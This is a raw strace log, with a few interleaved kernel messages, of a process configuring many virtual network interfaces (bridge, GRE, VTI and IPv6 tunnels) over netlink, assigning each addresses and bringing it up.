[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x0d\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0c\x08\x00\x01\x00\xac\x14\x14\x0c"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge0", ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x0d\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge0", ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x0d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x0c\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vcan0", ifr_ifindex=14}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x0e\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0d\x08\x00\x01\x00\xac\x14\x14\x0d"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vcan0", ifr_ifindex=14}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x0e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="tunl0", ifr_ifindex=2}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x02\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0e\x08\x00\x01\x00\xac\x14\x14\x0e"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="tunl0", ifr_ifindex=2}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x02\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="tunl0", ifr_ifindex=2}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="gre0", ifr_ifindex=3}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x03\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0f\x08\x00\x01\x00\xac\x14\x14\x0f"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="gre0", ifr_ifindex=3}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x03\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="gre0", ifr_ifindex=3}) = 0
[pid  5086] close(4)                    = 0
[   76.626773][ T5086] bridge0: port 2(bridge_slave_1) entered blocking state
[   76.634104][ T5086] bridge0: port 2(bridge_slave_1) entered forwarding state
[   76.642190][ T5086] bridge0: port 1(bridge_slave_0) entered blocking state
[   76.649345][ T5086] bridge0: port 1(bridge_slave_0) entered forwarding state
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="gretap0", ifr_ifindex=4}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x04\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x10\x08\x00\x01\x00\xac\x14\x14\x10"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="gretap0", ifr_ifindex=4}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x04\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="gretap0", ifr_ifindex=4}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x10\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip_vti0", ifr_ifindex=6}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x06\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x11\x08\x00\x01\x00\xac\x14\x14\x11"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip_vti0", ifr_ifindex=6}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x06\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip_vti0", ifr_ifindex=6}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6_vti0", ifr_ifindex=7}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x07\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x12\x08\x00\x01\x00\xac\x14\x14\x12"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6_vti0", ifr_ifindex=7}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x07\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6_vti0", ifr_ifindex=7}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x07\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6tnl0", ifr_ifindex=9}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x09\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x13\x08\x00\x01\x00\xac\x14\x14\x13"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6tnl0", ifr_ifindex=9}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x09\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6tnl0", ifr_ifindex=9}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6gre0", ifr_ifindex=10}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x0a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x14\x08\x00\x01\x00\xac\x14\x14\x14"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6gre0", ifr_ifindex=10}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x0a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6gre0", ifr_ifindex=10}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x0a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
